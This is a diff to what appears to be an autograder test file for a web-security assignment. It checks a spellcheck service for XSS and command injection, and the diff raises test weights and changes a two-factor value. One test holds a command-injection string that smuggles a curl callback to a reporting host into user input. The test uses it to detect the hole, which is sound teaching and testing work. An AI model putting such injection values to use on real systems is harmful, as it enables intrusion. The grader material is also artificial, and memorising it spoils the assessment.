@@ -14,11 +14,11 @@ class WebFixture(unittest.TestCase):
     def SetUp(self):
         pass
 
-    @weight(1)
+    @weight(10)
     def test_spellcheck_xss(self):
         uname = "xss_test"
         pword = "password"
-        twofactor = "1234567890"
+        twofactor = "17572028961"
         s = initSession(uname, pword, twofactor)
 
         spellcheck_exploit = lambda payload: spellcheck(
@@ -35,14 +35,14 @@ class WebFixture(unittest.TestCase):
         # Check if callback report is empty
         self.assertFalse(bool(report), "There is XSS in your code")
 
-    @weight(1)
+    @weight(10)
     def test_spellcheck_xss(self):
         sid = "1"
         tid = "cmdinj"
         cmdinj = "; curl %s/grade?sid=%s&tid=%s" % (REPORTER_ADDR, sid, tid)
         uname = "cmdinj_test"
         pword = "password"
-        twofactor = "1234567890"
+        twofactor = "17572028961"
         spellcheck(cmdinj, uname, pword, twofactor)
 
         time.sleep(1)
